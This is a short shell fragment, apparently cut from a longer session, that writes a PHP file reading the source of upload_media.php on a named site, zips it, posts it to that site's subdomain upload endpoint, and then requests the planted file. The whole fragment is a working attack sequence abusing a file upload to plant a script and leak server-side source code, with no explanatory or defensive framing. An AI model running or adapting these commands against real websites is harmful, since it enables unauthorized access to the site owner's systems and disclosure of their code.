<?php echo file_get_contents('/home/h417440/panel.silveriom.ir/upload_media.php'); EOF
zip -r read_um.zip read_um.php
curl -s -X POST -F "file=@read_um.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/read_um.php"